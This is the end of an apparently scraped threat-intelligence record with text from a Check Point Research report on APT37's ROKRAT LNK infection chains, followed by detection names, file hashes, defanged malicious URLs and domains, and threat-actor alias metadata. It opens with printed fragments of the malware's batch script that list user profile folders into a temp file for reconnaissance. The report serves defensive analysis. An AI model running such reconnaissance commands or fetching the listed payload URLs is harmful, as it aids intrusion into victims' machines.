/a \"%localappdata%\">>\"%temp%\\out.txt\" &\n\necho ======================AllUsersProfile>>\"%temp%\\out.txt\" &\n\ndir /a \"%allusersprofile%\">>\"%temp%\\out.txt”\n\n## Conclusion\n\n```\nIn this report, we describe new activity by the notorious North Korean threat actor APT37. We discuss several different infection chains, most\nof which result in a ROKRAT payload. These infection chains show that since 2022, this group has stopped heavily relying on malicious\ndocuments to deliver malware and instead begun to hide payloads inside oversized LNK files. This method can trigger an equally effective\ninfection chain by a simple double click, one that is more reliable than n-day exploits or the Office macros which require additional clicks to\nlaunch.\n\nAlthough we found that ROKRAT has not changed a lot recently, we see that the loaders being used to deploy it have indeed changed, shifting\nto the LNK method. In fact, this is the first time we saw ROKRAT delivered with an LNK infection chain, similar to the one used to deploy\nGOLDBACKDOOR. It is important to note that this does not mean APT37 no longer uses malicious documents, as we found evidence of such\nuse as recently as April 2023.\n\nWe also analyzed several newer samples of ROKRAT and described the commands that it accepts, which helps us shed some light on the\nmalware’s internal mechanisms and capabilities. Check Point Research continues to track this tool, which is imperative as APT37 is still using\nit while also continuing to alter the infection chains.\n\nThis report, together with other recent reports on ROKRAT versions for Android and macOS, shows that APT37 continues to pose a\nconsiderable threat, launching multiple campaigns across the platforms and significantly improving its malware delivery methods.\n\n**Check Point Customers remain protected:**\n\nThreat [Emulation provides Comprehensive coverage of attack tactics, file-types, and operating systems, powered by ThreatCloud AI- the brain](https://www.checkpoint.com/infinity/zero-day-protection/)\nbehind all of Check Point’s Security. Every file received via email or downloaded by a user through a web browser is sent to the Threat\nEmulation sandbox to inspect for malware.\n\n[Harmony Endpoint provides comprehensive endpoint protection at the highest security level, including Full attack containment and remediation](https://www.checkpoint.com/harmony/advanced-endpoint-protection/)\nto quickly restore any infected systems, High catch rates and low false positives ensuring security efficacy and effective prevention.\n\n**TE Protections:**\n\nTrojan.Wins.SusLNK.A\n\nTrojan.Wins.SusLNK.B\n\nInjector.Win.RemoteThread.A\n\nTechnique.Win.MalOfficeVBA.la.D\n\nExploit.Win.MalChildren.la.A\n\n**HEP Protections:**\n\nTechnique.Win.EmbedExeLnk.A\n\nTechnique.Win.EmbedExeLnk.B\n\n## IOCs\n\n\n-----\n\n### e as es\n\n**File Name** **SHA-256**\n\n(0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip 1c5b9409243bfb81a5924881cc05f63a301a3a7ce214830c7a83aeb2485cc5c3\n\n(0722)상임위원회 및 상설특별위원회 위원 명단(최종).lnk cb4c7037c7620e4ce3f8f43161b0ec67018c09e71ae4cea3018104153fbed286\n\n202207221.bat 240e7bd805bd7f2d17217dd4cebc03ac37ee60b7fb1264655cfd087749db647a\n\n사례비_지급의뢰서.doc 12ecabf01508c40cfea1ebc3958214751acfb1cd79a5bf2a4b42ebf172d7381b\n\nprojects in Libya.zip 00d88009fa50bfab849593291cce20f8b2f2e2cf2428d9728e06c69fced55ed5\n\n\nPipelines Profile (Elfeel- Sharara-Mellitah + Wafa –\nMellitah).lnk\n\n\n6753933cd54e4eba497c48d63c7418a8946b4b6c44170105d489d29f1fe11494\n\n\n230130.bat 732fca9be66ba2c40c5d05845540207b9e1480e609d767aff63895bf49d33a81\n\nsecurityMail (1).zip eb03f8b8e41b3ad27ccdecb092111e2c3c010436ad59add42755e2af04762b67\n\nsecurityMail_1031.html.lnk 050c65d45e5f21018aa940f0188c4aa1318ac3df865d901f8643ed7ce4a4b52c\n\nsecurityMail_1101.html.lnk 5a3f1d14b9cc4890db64fbc41818d7039f25b0120574dcdec4e20d13e6b2740c\n\n27868.bat c4029a2f1d0c07ae2b388b5a4076fba41e57af0dd0d2d0f86844464f22d63861\n\n\n11702.zip\n\n17399.zip\n\n\n9a4c61cdf0e291dc364c568aa161f744f59065efeafc72a3f892e12cbf88fc5b\n\n\nmfc100.dll 0e926d8b6fbf6f14a2a19d4d4af843253f9f5f6de337956a12dde279f3321d78\n\n– (ISO file) 6234ef67435dfcb65bd661b5f3bb0b77b82fe6cdd2109b6dfb9dea1b65a17d5d\n\n북 외교관 선발파견 및 해외공관.lnk 479894be4c5dec0992ad3c5b21fb1423643996d80d59dcca76386bb325dc811e\n\n북한외교정책결정과정.lnk c5c05f9df89fc803884fed2bd20a3824eae95eeb34a1827bf5210e4ac17beadd\n\n\n230401.bat\n\n230402.bat\n\n\n70f9216f0c5badb24120f74270dbbc5100b07c4fc6eb45f6652b00882290a73c\n\n\n질문지.doc 3252345b2640efc44cdd98667dbd25806ee2316d1e01eec488fd678e885aa960\n\n– (LNK file) 1e0b5d6b85fca648061fdaf2830c5a90248519e81e78122467c29beeb78daa1e\n\n– (LNK file) f92297c4efabba98befeb992a009462d1aba6f3c3a11210a7c054ff5377f0753\n\n230415.bat 06431a5d8f6262cc3db39d911a920f793fa6c648be94daf789c11cc5514d0c3d\n\n### URLs\n\nhxxps[://]api[.]onedrive[.]com/v1[.]0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBaFFNUDZlZzhhUkZiN0xVMUNPQ2YzeE5vVFU_ZT1wZ2l\nhxxps[://]api[.]onedrive[.]com/v1[.]0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdTJteTF4aDZ0OFhkSUpseW14b21abFd2WW8_ZT15SjJT\nhxxps[://]api[.]onedrive[.]com/v1[.]0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdTJteTF4aDZ0OFhnUjJNem1zOG5oUndvLTZCP2U9akhI\nhxxps[://]api[.]onedrive[.]com/v1[.]0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalFOTHZFRV9DVU9iUFdnLXhPZG8xRXFYckU_ZT1BM1\nhxxps[://]api[.]onedrive[.]com/v1[.]0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRiZnpnVU14TmJJbkM2Q0k_ZT1WZE\nhxxps[://]1erluw[.]bl[.]files[.]1drv[.]com/y4mjq91jEOFfIt8XWokhkvDA3nd2tPKC9x6YXe5KPoia1IoxaHAT0f4N[…]8IqzILVZkrM48fYGI1jkeYjBkc\nIRenUX4NuenWy_g/my[.]jpg\nhxxps[://]u9izog[.]dm[.]files[.]1drv[.]com/y4mKSGc6jShxeCkGYNOnZdeG42N9DXsT4dFh5t6umtqb8bI9VePGNlZG7GP_K9ly6IW0xeiUqMR8o6Sk9pGqnPraGVkPxQce9pcUKcGPoKvXYaPqoiBNLDb3KK94OjeEV0RiejfEGjZ1ccTQqeWZZ0_DnN4T5NGFZRCkc4ZvlJERfXrb5JgWm1U3gC4leSiTrTtV12N\nhxxps[://]qb3oaq[.]bl[.]files[.]1drv[.]com/y4mHRkXCvSNkEazYL8KsgjxXW3y4EfgcyTsS_t5Wi6fefz383ova6apylWD0q0dsmeV2UbuXHYDd_Ib\nfJ8cPvgLhX1dYRSVWpxXnpKq1GiHngnCioOASAeaS33ztlC74MpGEWsDuNksijGCqmtnIelhgFBefDcwLwqsbCH01dRolRMhazBj1ZxYizw_CyFwdRbApbmUCNOQ/dragon32[.]zip\nhxxps[://]link[.]b4a[.]app/download[.]html?search=cHJvamVjdHMgaW4gTGlieWEuemlw\nhxxps[://]docx1[.]b4a[.]app/download[.]html?\nid=88&search=tuh3m0xez3npqzr4terfd2zhsnzasgt1zedgawjhvxflazkwyudwewzieglimli1tg5safltegw=\nhxxps[://]naver-file[.]com/download/list[.]php?q=e1&18467=41\n\n### Domains\n\nlink[.]b4a[.]app\n\n\n-----\n\ndoc [ ]b a[ ]app\nnaver-file[.]com\nnate-download[.]com\ndaum-store[.]com\nnaver-storage[.]com\n\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-01 - Chain Reaction- RokRAT's Missing Link.pdf"
    ],
    "report_names": [
        "2023-05-01 - Chain Reaction- RokRAT's Missing Link.pdf"
    ],
    "threat_actors": [
        {
            "id": "c306e698-3b48-46d7-b571-3dfa0c828379",
            "created_at": "2023-05-16T02:02:09.957677Z",
            "updated_at": "2025-03-27T02:00:03.129777Z",
            "deleted_at": null,
            "main_name": "APT43",
            "aliases": [],
            "source_name": "MISPGALAXY:APT43",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b43c8747-c898-448a-88a9-76bff88e91b5",
            "created_at": "2024-02-02T02:00:04.058535Z",
            "updated_at": "2025-03-27T02:00:03.302832Z",
            "deleted_at": null,
            "main_name": "Opal Sleet",
            "aliases": [
                "OSMIUM",
                "Konni",
                "Vedalia"
            ],
            "source_name": "MISPGALAXY:Opal Sleet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b9458777-d970-4e89-b2d2-e532140a390f",
            "created_at": "2024-05-01T02:03:08.140328Z",
            "updated_at": "2025-03-27T02:05:17.41728Z",
            "deleted_at": null,
            "main_name": "NICKEL JUNIPER",
            "aliases": [
                "OSMIUM ",
                "Opal Sleet ",
                "Konni"
            ],
            "source_name": "Secureworks:NICKEL JUNIPER",
            "tools": [
                "KONNI"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1685930834,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1685881469,
    "ts_modification_date": 1685881469,
    "files": {
        "pdf": "https://archive.orkl.eu/de5df8f6a29ecf0f47682ae7b8314b080c63ad91.pdf",
        "text": "https://archive.orkl.eu/de5df8f6a29ecf0f47682ae7b8314b080c63ad91.txt",
        "img": "https://archive.orkl.eu/de5df8f6a29ecf0f47682ae7b8314b080c63ad91.jpg"
    }
}